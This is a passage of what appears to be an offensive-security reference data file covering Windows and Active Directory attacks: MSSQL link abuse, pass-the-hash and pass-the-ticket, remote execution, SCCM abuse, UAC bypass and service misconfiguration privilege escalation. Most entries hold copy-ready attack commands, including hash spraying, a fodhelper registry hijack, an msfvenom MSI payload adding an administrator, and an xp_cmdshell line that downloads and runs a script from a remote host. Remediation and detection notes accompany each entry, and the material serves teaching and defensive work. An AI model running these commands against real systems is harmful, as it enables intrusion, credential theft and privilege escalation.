            rows: [
              ["Links store a login", "Queries on the far server run as the link's configured account, not yours"],
              ["Links are often over-privileged", "A link frequently authenticates as a sysadmin or a higher-priv SQL login"],
              ["Links can be chained", "A -> B -> C: you reach C with C's link context even with no rights on C directly"],
              ["xp_cmdshell", "If enabled (or enable-able as sysadmin), gives OS command execution as the SQL service account"],
              ["Impersonation", "EXECUTE AS / trustworthy databases can further elevate within an instance"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Enumerate MSSQL instances + your access", "A reachable instance"],
              ["2", "Enumerate and crawl database links", "Map of the trust chain + contexts"],
              ["3", "Find a hop where the link is sysadmin", "Privileged execution context"],
              ["4", "xp_cmdshell on that linked server", "RCE as the SQL service account"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PowerUpSQL / SharpSQL", "Discover instances, check privileges, crawl links (Get-SQLServerLinkCrawl)"],
              ["mssqlclient.py (Impacket)", "Manual authenticated SQL, openquery link hopping, xp_cmdshell"],
              ["Sliver (execute-assembly)", "Run SharpSQL / a PS2EXE-packaged PowerUpSQL in memory"],
              ["Rubeus", "Kerberos auth / ticket for the SQL service where needed"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "NetSPI — Hacking SQL Server database links", url: "https://www.netspi.com/blog/technical-blog/network-penetration-testing/how-to-hack-database-links-in-sql-server/" },
              { label: "PowerUpSQL — GitHub", url: "https://github.com/NetSPI/PowerUpSQL" },
              { label: "MITRE ATT&CK — SQL Stored Procedures (T1505.001)", url: "https://attack.mitre.org/techniques/T1505/001/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Remove unnecessary database links; where required, configure them with a least-privilege login, never a sysadmin.",
              "Keep xp_cmdshell disabled and deny the SQL service account local privileges it does not need.",
              "Run SQL Server services as low-privileged (virtual/managed) accounts so RCE via xp_cmdshell yields little.",
              "Audit sysservers / linked-server logins regularly; alert on Get-SQLServerLinkCrawl-style recursive openquery activity.",
              "Segment SQL servers and restrict which principals can CONNECT to each instance."
            ]
          }
        ]
      },

      {
        id: "pass-the-hash",
        name: "Pass-the-Hash / Pass-the-Ticket",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1550/002/",
        theory: "theory/2026-08-18-ntlm.html",
        description: "Reuse a stolen NT hash, Kerberos ticket, or key to authenticate as a user without ever knowing their password.",
        brief: "Windows authentication proves knowledge of a secret derived from the password, not the password itself — so a stolen NT hash (NTLM), Kerberos ticket, or Kerberos key is a credential you can replay directly. Pass-the-Hash reuses the NT hash; Pass-the-Ticket injects a stolen TGT/TGS; Overpass-the-Hash turns an NT hash into a fresh TGT; Pass-the-Key uses the AES key.\n\nImpact: these convert a single credential-dump into movement across every host that trusts that identity, without cracking anything. A reused local admin hash or a captured Domain Admin ticket spreads laterally at will.",
        quickReference: [
          { label: "Pass-the-Hash to a shell", cmd: "psexec.py -hashes :<nthash> corp.local/Administrator@10.10.10.10" },
          { label: "PtH validate/spray across a subnet", cmd: "netexec smb 10.10.10.0/24 -u Administrator -H <nthash> --local-auth" },
          { label: "Overpass-the-Hash (NT hash → TGT)", cmd: "getTGT.py corp.local/svc -hashes :<nthash> ; export KRB5CCNAME=svc.ccache" },
          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=stolen.ccache ; psexec.py -k -no-pass target" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Pass-the-Hash — authenticate with the NT hash directly", cmd: "# any Impacket exec tool accepts -hashes LM:NT (LM can be empty)\npsexec.py -hashes :2777b7fec870e04dda00cd7260f7bee6 corp.local/Administrator@10.10.10.10\n# evil-winrm: evil-winrm -i host -u Administrator -H <nthash>" },
              { label: "2. Spray a (possibly shared local-admin) hash across the fleet", cmd: "netexec smb 10.10.10.0/24 -u Administrator -H <nthash> --local-auth\n# (Pwn3d!) marks hosts where the hash grants admin — instant lateral map" },
              { label: "3. Overpass-the-Hash — mint a real Kerberos TGT from the NT hash", cmd: "getTGT.py corp.local/administrator -hashes ':<nthash>' -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache\npsexec.py -k -no-pass corp.local/administrator@dc01.corp.local\n# from here you are using Kerberos, which blends in better than raw NTLM" },
              { label: "4. Pass-the-Key — use the AES256 key instead of the NT hash", cmd: "getTGT.py corp.local/administrator -aesKey <aes256_key> -dc-ip 10.10.10.10\nexport KRB5CCNAME=administrator.ccache   # AES avoids RC4 downgrade detections" },
              { label: "5. Pass-the-Ticket — inject a ticket you stole from memory", cmd: "# Rubeus.exe dump  ->  base64 TGT  ->  Rubeus.exe ptt /ticket:<b64>\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" }
            ]
          },
          {
            title: "Credential-Reuse Variants",
            type: "table",
            columns: ["Technique", "Secret used"],
            rows: [
              ["Pass-the-Hash", "NT hash → NTLM authentication"],
              ["Overpass-the-Hash", "NT hash → request a real Kerberos TGT"],
              ["Pass-the-Key", "AES128/256 key → request a TGT (stealthier than RC4)"],
              ["Pass-the-Ticket", "A stolen TGT/TGS → inject and reuse directly"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Dump a hash/ticket/key (see Credential Access)", "A reusable secret"],
              ["2", "Validate where it grants access (NetExec spray)", "Map of reachable hosts"],
              ["3", "PtH/PtT into a target (psexec/wmiexec/evil-winrm)", "Code execution as the identity"],
              ["4", "Repeat toward higher privilege", "Path to Domain Admin"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket psexec/wmiexec/getTGT", "PtH, overpass-the-hash, pass-the-key execution"],
              ["NetExec", "Spray hashes to map admin access (--local-auth / -H)"],
              ["Rubeus", "dump/ptt (pass-the-ticket), asktgt (overpass-the-hash)"],
              ["Mimikatz", "sekurlsa::pth, kerberos::ptt"],
              ["evil-winrm", "-H to pass-the-hash over WinRM"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1550.002 — Pass the Hash", url: "https://attack.mitre.org/techniques/T1550/002/" },
              { label: "Hadess — Pwning the Domain: Lateral Movement", url: "https://hadess.io/" },
              { label: "The Hacker Recipes — Pass-the-hash / ticket", url: "https://www.thehacker.recipes/ad/movement/ntlm/pth" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Deploy LAPS so a stolen local-admin hash cannot be reused on other hosts.",
              "Enforce tiered administration so a captured Tier-0 hash/ticket is never present on a Tier-2 workstation.",
              "Enable Credential Guard and LSA Protection to make hashes/tickets harder to steal in the first place.",
              "Block/limit NTLM where possible and prefer Kerberos; monitor for RC4 overpass-the-hash (encryption downgrade).",
              "Detect: the same account authenticating to many hosts rapidly, and TGT requests from unusual hosts (event 4768/4624 type 3/9)."
            ]
          }
        ]
      },
      {
        id: "remote-execution",
        name: "Remote Service Execution (PsExec / WMI / WinRM / RDP)",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1021/",
        theory: "theory/2026-08-18-ntlm.html",
        description: "Given valid credentials or a hash, execute code on remote hosts through SMB service creation, WMI, WinRM, or RDP.",
        brief: "Once you hold a working credential (password, hash, or ticket), Windows offers many legitimate remote-administration channels that double as lateral-movement vectors: SMB service creation (PsExec/SMBExec), WMI (WMIExec), WinRM (evil-winrm), and RDP (xfreerdp). Each authenticates, runs your command as the target user or SYSTEM, and returns output.\n\nImpact: this is how a single valid admin credential becomes execution on dozens of hosts. The vectors differ in noise and artifacts, so attackers pick the quietest one that works.",
        quickReference: [
          { label: "PsExec (SMB service, SYSTEM shell)", cmd: "psexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10" },
          { label: "WMIExec (semi-interactive, fileless-ish)", cmd: "wmiexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10" },
          { label: "WinRM (evil-winrm, quiet)", cmd: "evil-winrm -i 10.10.10.10 -u Administrator -p 'Passw0rd'" },
          { label: "RDP (graphical)", cmd: "xfreerdp /u:Administrator /p:'Passw0rd' /v:10.10.10.10 /dynamic-resolution" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm where the credential grants admin (NetExec)", cmd: "netexec smb 10.10.10.0/24 -u Administrator -p 'Passw0rd'\n# (Pwn3d!) on a host means admin -> pick an execution vector below" },
              { label: "2. PsExec — creates a service over SMB, runs as SYSTEM (loud but reliable)", cmd: "psexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10\n# uploads a binary to ADMIN$, registers+starts a service -> nt authority\\system" },
              { label: "3. WMIExec — execute via WMI, no service/binary dropped (quieter)", cmd: "wmiexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10\n# runs as the user (not SYSTEM); good when service creation is monitored" },
              { label: "4. WinRM — management protocol, native remoting (blends with admin traffic)", cmd: "evil-winrm -i 10.10.10.10 -u Administrator -p 'Passw0rd'\n# with a hash:  evil-winrm -i 10.10.10.10 -u Administrator -H <nthash>\n# requires the account in Remote Management Users / WinRM enabled (5985/5986)" },
              { label: "5. RDP — interactive desktop (when GUI access is needed)", cmd: "xfreerdp /u:'corp.local\\\\Administrator' /p:'Passw0rd' /v:10.10.10.10 /cert:ignore\n# Restricted Admin mode enables pass-the-hash RDP:  /pth:<nthash>" },
              { label: "6. SMBExec / atexec alternatives", cmd: "smbexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10   # semi-interactive, no output file on some variants\natexec.py corp.local/Administrator:'Passw0rd'@10.10.10.10 whoami  # via Task Scheduler" }
            ]
          },
          {
            title: "Vectors Compared",
            type: "table",
            columns: ["Vector", "Runs as / notes"],
            rows: [
              ["PsExec (SMB + service)", "SYSTEM; reliable, but service creation is noisy (event 7045)"],
              ["SMBExec", "SYSTEM; similar to PsExec, slightly different artifacts"],
              ["WMIExec (WMI)", "The user; no binary/service dropped — quieter"],
              ["WinRM (evil-winrm)", "The user; blends with legitimate remote management"],
              ["RDP (xfreerdp)", "Interactive desktop; Restricted Admin allows PtH"],
              ["AtExec (Task Scheduler)", "SYSTEM; one-shot command execution"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain a valid credential/hash/ticket", "Authentication material"],
              ["2", "NetExec-map where it is admin", "List of executable targets"],
              ["3", "Pick the quietest working vector", "Code execution on the target"],
              ["4", "Dump creds / act, then repeat", "Chain across the network"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket psexec/smbexec/wmiexec/atexec", "Remote execution over SMB/WMI/Task Scheduler"],
              ["evil-winrm", "Interactive WinRM shell (password or hash)"],
              ["xfreerdp / rdesktop", "RDP, including Restricted Admin PtH"],
              ["NetExec", "Map admin access and run commands at scale (-x / -X)"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1021 — Remote Services", url: "https://attack.mitre.org/techniques/T1021/" },
              { label: "Hadess — Pwning the Domain: Lateral Movement", url: "https://hadess.io/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Restrict local admin and Remote Management Users membership; enforce the principle of least privilege for remote access.",
              "Enable the Windows Firewall to limit SMB/WMI/WinRM/RDP to management subnets and jump hosts only.",
              "Enforce tiered administration and use Restricted Admin / Remote Credential Guard for RDP to avoid exposing credentials.",
              "Enable command-line and PowerShell logging; alert on service creation (7045), remote WMI, and new WinRM sessions.",
              "Detect: Impacket artifacts (randomly named services, ADMIN$ writes, __output files) and lateral admin logons (4624 type 3)."
            ]
          }
        ]
      },
      {
        id: "mssql-lateral",
        name: "MSSQL Lateral Movement",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1210/",
        theory: "theory/2026-08-18-ad-fundamentals.html",
        description: "Abuse SQL Server logins and trusted database links to execute OS commands and hop between servers — even across forest trusts.",
        brief: "SQL Server is deeply integrated with AD: domain users can be SQL logins, sysadmins can run OS commands via xp_cmdshell, and 'linked servers' let one instance run queries (and commands) on another. Attackers enumerate reachable instances, escalate within them, execute OS commands, and traverse database links to pivot between hosts.\n\nImpact: a foothold on one SQL server frequently leads to code execution on it (as the service account) and onward to other linked instances — a movement path that works even across forest trusts.",
        quickReference: [
          { label: "Find/authenticate to an instance", cmd: "netexec mssql 10.10.10.10 -u svc_sql -p 'Passw0rd' -q 'SELECT @@version'" },
          { label: "OS command via xp_cmdshell", cmd: "powershell Invoke-SQLOSCmd -Instance sql01.corp.local -Command 'whoami' -RawResults" },
          { label: "Enumerate + crawl linked servers", cmd: "Get-SQLServerLinkCrawl -Instance sql01.corp.local -Verbose" },
          { label: "Impacket shell", cmd: "mssqlclient.py corp.local/svc_sql:'Passw0rd'@10.10.10.10 -windows-auth" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Discover instances you can reach (SPNs / UDP / creds)", cmd: "# from inside the domain, SQL SPNs reveal instances:\nGet-SQLInstanceDomain | Get-SQLServerInfo -Verbose\n# test a login:\nnetexec mssql 10.10.10.10 -u 'corp.local\\svc' -p 'Passw0rd'" },
              { label: "2. Execute OS commands via xp_cmdshell (PowerUpSQL auto-enables it)", cmd: "powershell Invoke-SQLOSCmd -Instance sql01.corp.local -Command 'whoami' -RawResults\n# Invoke-SQLOSCmd enables xp_cmdshell if disabled, runs, then disables it again\n# manual: EXEC sp_configure 'show advanced options',1; RECONFIGURE;\n#         EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';" },
              { label: "3. Impersonate a more privileged login (EXECUTE AS)", cmd: "# if your login can impersonate sa or a sysadmin:\nEXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER; -- now sysadmin\n# PowerUpSQL: Invoke-SQLAudit / Invoke-SQLEscalatePriv -Instance sql01" },
              { label: "4. Crawl trusted database links to reach other servers", cmd: "Get-SQLServerLinkCrawl -Instance sql01.corp.local -Verbose\n# run a query (or command) on a linked instance:\nGet-SQLServerLinkCrawl -Instance sql01 -Query 'exec master..xp_cmdshell ''whoami'''\n# links can chain across servers and even across forest trusts" },
              { label: "5. Get a shell / reverse shell from a linked instance", cmd: "Get-SQLServerLinkCrawl -Instance sql01 -Query \"exec master..xp_cmdshell 'powershell iex(New-Object Net.WebClient).DownloadString(''http://10.10.14.5/p.ps1'')'\"" }
            ]
          },
          {
            title: "Abuse Primitives",
            type: "table",
            columns: ["Primitive", "Detail"],
            rows: [
              ["xp_cmdshell", "OS command execution as the SQL service account (needs sysadmin)"],
              ["EXECUTE AS / impersonation", "Escalate from a low login to sysadmin within the instance"],
              ["Linked servers", "Run queries/commands on a remote instance the current one trusts"],
              ["Link crawling", "Chain multiple links to reach far instances, across forest trusts"],
              ["UNC path / xp_dirtree", "Coerce the service account to authenticate to you (relay/roast)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Enumerate reachable SQL instances", "Login targets"],
              ["2", "Authenticate / impersonate to sysadmin", "Full control of the instance"],
              ["3", "xp_cmdshell for OS execution", "Code execution as the service account"],
              ["4", "Crawl linked servers", "Pivot to other SQL hosts / forests"],
              ["5", "Repeat / dump creds", "Broader compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PowerUpSQL", "Discovery, xp_cmdshell, impersonation, link crawling"],
              ["Impacket mssqlclient.py", "Interactive SQL shell (Windows auth / hash)"],
              ["NetExec (mssql)", "Auth, query, and command execution at scale"],
              ["mssql-relay / xp_dirtree", "Coerce the service account for relay/roasting"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Lateral Movement (MSSQL)", url: "https://hadess.io/" },
              { label: "PowerUpSQL wiki", url: "https://github.com/NetSPI/PowerUpSQL/wiki" },
              { label: "The Hacker Recipes — MSSQL", url: "https://www.thehacker.recipes/ad/movement/mssql" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Keep xp_cmdshell disabled and deny sysadmin to application/service logins; grant least privilege.",
              "Avoid linked servers configured with high-privilege credentials; use least-privilege link accounts and audit link chains.",
              "Run SQL Server as a low-privileged (gMSA) service account so xp_cmdshell execution is contained.",
              "Restrict network access to SQL ports (1433/UDP 1434) to application tiers only.",
              "Detect: xp_cmdshell enablement/execution, EXECUTE AS to sysadmin, and cross-instance link queries."
            ]
          }
        ]
      },
      {
        id: "sccm-abuse",
        name: "SCCM / ConfigMgr Abuse",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1072/",
        theory: "theory/2026-08-18-ad-fundamentals.html",
        description: "Microsoft SCCM manages endpoints with powerful accounts and can deploy code fleet-wide — its Network Access Account, Client Push, and app deployment are all abusable.",
        brief: "System Center Configuration Manager (SCCM/ConfigMgr) is a fleet-management platform: it stores privileged accounts (the Network Access Account), can be made to authenticate to endpoints (Client Push), and can deploy applications and scripts to any managed device. Each of these is an attacker primitive.\n\nImpact: harvesting the NAA yields a domain credential; coercing Client Push captures the client-push account's authentication (crack or relay); and application/script deployment is authenticated remote code execution across every managed endpoint — a route to mass compromise from a single SCCM role abuse.",
        quickReference: [
          { label: "Harvest the Network Access Account (NAA)", cmd: "SharpSCCM.exe local secrets disk   (or: local secrets wmi)" },
          { label: "Coerce Client Push, capture NTLM", cmd: "responder -I eth0   (then trigger a client-push notification to your host)" },
          { label: "Enumerate your SCCM rights", cmd: "SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p RoleNames" },
          { label: "Deploy an app for RCE on a device", cmd: "SharpSCCM.exe exec -rid <ResourceID> -r <attacker_ip>" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Harvest the Network Access Account from a client (DPAPI-protected)", cmd: "# the NAA policy is stored, DPAPI-encrypted, in the CIM/WMI store on every client\nSharpSCCM.exe local secrets disk     # decrypt from the CIM store on disk\nSharpSCCM.exe local secrets wmi      # or from WMI\n# mimikatz # dpapi::sccm   also recovers it\n# NAA is a domain account -> immediate credential, sometimes over-privileged" },
              { label: "2. Coerce Client Push and capture the push account's NTLM", cmd: "# stand up a listener, then trigger client-push installation toward it\nresponder -I eth0\n# SharpSCCM.exe invoke client-push -t attacker_ip   (or via the console)\n# captures the Client Push account (local admin on all clients) + machine account\n# crack (hashcat -m 5600) or relay it" },
              { label: "3. Enumerate your effective SCCM privileges", cmd: "SharpSCCM.exe get class-instances SMS_Admin -p CategoryNames -p RoleNames -p LogonName\n# 'Full Administrator' on the compromised user = fleet-wide deployment rights" },
              { label: "4. Deploy an application/script to a target device (authenticated RCE)", cmd: "# find an active client and its ResourceID\nSharpSCCM.exe get devices -w \"Active=1 and Client=1\"\n# execute against it (relay/capture NTLM, or run as the logged-on user / SYSTEM)\nSharpSCCM.exe exec -rid 16777220 -r attacker_ip                 # capture NTLM\nSharpSCCM.exe exec -rid 16777220 -r attacker_ip --run-as-system # run as SYSTEM" },
              { label: "5. Clean up deployment artifacts", cmd: "# delete the created application/device collection and deployment after use" }
            ]
          },
          {
            title: "SCCM Attack Primitives",
            type: "table",
            columns: ["Primitive", "Detail"],
            rows: [
              ["Network Access Account (NAA)", "Domain account stored DPAPI-encrypted on every client — decrypt it"],
              ["Client Push", "Coerce SCCM to authenticate with the push account (local admin on all clients)"],
              ["Application/Script deployment", "Authenticated code execution on any managed device"],
              ["Policy secrets", "NAA and other secrets fetchable from Management Points"],
              ["Persistence after change", "Old NAA binaries remain decryptable on enrolled hosts"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Foothold on an SCCM client or admin", "Access to CIM store / SCCM console"],
              ["2", "Harvest NAA / coerce Client Push", "Domain credential / captured NTLM"],
              ["3", "Enumerate SCCM role (Full Administrator?)", "Deployment capability"],
              ["4", "Deploy app/script to targets", "RCE across managed endpoints"],
              ["5", "Relay captured auth / reuse NAA", "Mass compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["SharpSCCM", "NAA harvest, Client Push, enumeration, deployment"],
              ["Mimikatz (dpapi::sccm)", "Decrypt the NAA from DPAPI"],
              ["Responder / ntlmrelayx", "Capture/relay the coerced Client Push authentication"],
              ["SharpDPAPI", "Alternative DPAPI decryption of SCCM secrets"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Lateral Movement (SCCM)", url: "https://hadess.io/" },
              { label: "SharpSCCM wiki", url: "https://github.com/Mayyhem/SharpSCCM/wiki" },
              { label: "MITRE ATT&CK T1072 — Software Deployment Tools", url: "https://attack.mitre.org/techniques/T1072/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Avoid the Network Access Account where possible (use Enhanced HTTP); if used, make it a least-privilege domain account.",
              "Disable Client Push installation, or enforce it to require Kerberos and disallow NTLM fallback.",
              "Restrict SCCM 'Full Administrator' and deployment rights; treat the primary site server as Tier-0.",
              "Require SMB signing and LDAP channel binding so captured SCCM authentications cannot be relayed.",
              "Detect: SharpSCCM activity, anomalous application deployments, and Client Push authentications to non-SCCM hosts."
            ]
          }
        ]
      }
    ]
  },
  {
    category: "Privilege Escalation",
    vulns: [
      {
        id: "uac-bypass",
        name: "UAC Bypass",
        severity: "Medium",
        ref: "https://attack.mitre.org/techniques/T1548/002/",
        theory: "theory/2026-08-18-windows-tokens-uac.html",
        description: "Abuse Windows auto-elevating binaries and trusted-path logic to run code with a full admin token from a filtered medium-integrity process — no consent prompt.",
        brief: "When an administrator is logged in, most processes run with a filtered (medium-integrity) token; a full admin token requires a UAC consent prompt. Certain signed Microsoft binaries <em>auto-elevate</em> without prompting, and several read attacker-controllable registry keys or load libraries from writable/normalised paths. Hijacking one of those lets a medium-integrity process spawn a high-integrity one silently.\n\nImpact: UAC is a convenience boundary, not a security boundary — a bypass turns 'admin but not elevated' into full local administrator without alerting the user, the usual first step before dumping credentials or installing persistence.",
        quickReference: [
          { label: "Check integrity level", cmd: "whoami /groups | findstr Label   (Medium = not elevated)" },
          { label: "fodhelper (registry hijack)", cmd: "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /ve /d \"cmd.exe\" /f\nreg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /f\nfodhelper.exe" },
          { label: "Automated (many techniques)", cmd: "UACME (akagi.exe) -m <method>   ;   metasploit bypassuac_* modules" },
          { label: "eventvwr / sdclt / computerdefaults", cmd: "similar HKCU registry hijacks against other auto-elevating binaries" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm you are admin but only medium integrity", cmd: "whoami /groups | findstr /i \"Label\"\n# 'Mandatory Label\\Medium Mandatory Level' = filtered token, UAC in the way\n# your user must be in the local Administrators group for elevation to be possible" },
              { label: "2. fodhelper — hijack the ms-settings handler it auto-elevates through", cmd: "reg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /ve /d \"cmd.exe /c start cmd.exe\" /f\nreg add \"HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" /v DelegateExecute /t REG_SZ /d \"\" /f\nfodhelper.exe\n# fodhelper auto-elevates, reads the HKCU handler, and launches your command HIGH integrity\nreg delete \"HKCU\\Software\\Classes\\ms-settings\" /f   # clean up" },
              { label: "3. Other auto-elevating binaries follow the same pattern", cmd: "# eventvwr.exe  -> HKCU\\Software\\Classes\\mscfile\\shell\\open\\command\n# sdclt.exe     -> HKCU\\Software\\Classes\\Folder\\shell\\open\\command  / exefile\n# computerdefaults.exe -> ms-settings (same as fodhelper)" },
              { label: "4. Trusted-directory / DLL-hijack variants (path normalization)", cmd: "# create a 'mock' trusted dir like C:\\Windows \\System32\\ (trailing space) and drop a\n# hijacked DLL an auto-elevating binary loads; the trusted-path check is fooled\n# UACME automates dozens of these (akagi.exe -m <n>)" },
              { label: "5. Automate the whole thing", cmd: "# UACME implements 70+ methods across Windows versions\nakagi.exe 33 C:\\temp\\payload.exe\n# metasploit: use exploit/windows/local/bypassuac_fodhelper (set SESSION)" }
            ]
          },
          {
            title: "Why Bypasses Exist",
            type: "table",
            columns: ["Mechanism", "Detail"],
            rows: [
              ["Auto-elevation", "Some signed MS binaries elevate with no prompt (autoElevate=true in the manifest)"],
              ["HKCU handler hijack", "They read program IDs / handlers from HKCU, which a medium process can write"],
              ["Path normalization", "Trusted-directory checks can be fooled with mock dirs (trailing space/dot)"],
              ["DLL search order", "An auto-elevating binary loads a DLL from a writable/normalised path"],
              ["Not a security boundary", "Microsoft does not service UAC bypasses as vulnerabilities"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Admin user, medium-integrity process", "Filtered token, need elevation"],
              ["2", "Plant an HKCU handler / hijack DLL", "Attacker-controlled elevation path"],
              ["3", "Launch the auto-elevating binary", "It runs your command high-integrity"],
              ["4", "Clean up the registry/DLL artifacts", "Silent full-admin token"],
              ["5", "Dump creds / persist as admin", "Consolidated local compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["UACME (akagi)", "70+ implemented UAC bypass methods"],
              ["reg.exe / PowerShell", "Plant the HKCU handler for the manual techniques"],
              ["Metasploit bypassuac_* modules", "Automated bypass from a session"],
              ["Process Explorer / sigcheck", "Find auto-elevating (autoElevate) binaries"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1548.002 — Bypass User Account Control", url: "https://attack.mitre.org/techniques/T1548/002/" },
              { label: "UACME — UAC bypass collection", url: "https://github.com/hfiref0x/UACME" },
              { label: "Hadess — UAC Evasion", url: "https://hadess.io/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set UAC to the highest level (Always Notify) so even auto-elevating binaries prompt.",
              "Do not let daily-use accounts be local administrators; use a separate admin account and a PAW for admin tasks.",
              "Monitor HKCU handler keys (ms-settings, mscfile, Folder\\shell\\open\\command) and auto-elevating binaries spawning shells.",
              "Application allow-listing (WDAC/AppLocker) limits what an elevated child can run.",
              "Detect: fodhelper/eventvwr/sdclt/computerdefaults launching cmd/powershell, and writes to the known hijack registry paths."
            ]
          }
        ]
      },
      {
        id: "windows-service-privesc",
        name: "Service & Registry Misconfigurations",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1543/003/",
        theory: "theory/2026-08-18-windows-tokens-uac.html",
        description: "Weak service permissions, unquoted service paths, writable service binaries, and AlwaysInstallElevated let a normal user run code as SYSTEM.",
        brief: "Windows services usually run as SYSTEM, so any weakness that lets a low-privileged user influence what a service executes is a direct path to SYSTEM. The classics: a service whose configuration you can change (weak service DACL), a service binary or its folder you can overwrite, an unquoted path containing spaces, or the AlwaysInstallElevated policy.\n\nImpact: these are the bread-and-butter of Windows local privilege escalation — a single misconfiguration on one host promotes a foothold to full local control, from where credential dumping and lateral movement follow.",
        quickReference: [
          { label: "Auto-enumerate privesc paths", cmd: "winPEAS.exe   ;   PowerUp: Invoke-AllChecks   ;   Seatbelt.exe -group=all" },
          { label: "Weak service DACL — repoint + run", cmd: "sc config <svc> binPath= \"C:\\temp\\rev.exe\" & sc start <svc>   (needs SERVICE_CHANGE_CONFIG)" },
          { label: "Unquoted service path", cmd: "Drop C:\\Program.exe for 'C:\\Program Files\\...\\svc.exe' unquoted, then restart the service" },
          { label: "AlwaysInstallElevated", cmd: "msfvenom -f msi -o evil.msi ... ; msiexec /quiet /qn /i evil.msi   (runs as SYSTEM)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate — let a tool find the winnable misconfig", cmd: "# any of these surfaces weak services, unquoted paths, writable dirs, GPP, AutoLogon...\nwinPEASx64.exe quiet\npowershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"\nSeatbelt.exe -group=all" },
              { label: "2. Weak service permissions — you can reconfigure the service", cmd: "# accesschk shows SERVICE_CHANGE_CONFIG for your group:\naccesschk.exe /accepteula -uwcqv \"Authenticated Users\" *\nsc config vulnsvc binPath= \"C:\\Windows\\Temp\\rev.exe\"\nsc stop vulnsvc & sc start vulnsvc   # rev.exe runs as the service account (often SYSTEM)" },
              { label: "3. Unquoted service path — Windows tries each space-split prefix", cmd: "# 'C:\\Program Files\\Vuln Service\\svc.exe' unquoted -> tries C:\\Program.exe first\nsc qc vulnsvc | findstr BINARY_PATH_NAME   # confirm no quotes + a space + a writable dir\ncopy rev.exe \"C:\\Program Files\\Vuln.exe\"   # if that folder is writable\nsc stop vulnsvc & sc start vulnsvc" },
              { label: "4. Writable service binary — just overwrite it", cmd: "# if you can write the .exe or its folder:\ncopy /y rev.exe \"C:\\Path\\To\\service.exe\"\nsc stop vulnsvc & sc start vulnsvc   # or wait for a reboot" },
              { label: "5. AlwaysInstallElevated — MSI installs run as SYSTEM", cmd: "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# both = 1 ->\nmsfvenom -p windows/x64/exec CMD='net localgroup administrators user /add' -f msi -o e.msi\nmsiexec /quiet /qn /i e.msi" }
            ]
          },
          {
            title: "Misconfiguration Classes",
            type: "table",
            columns: ["Class", "Why it escalates"],
            rows: [
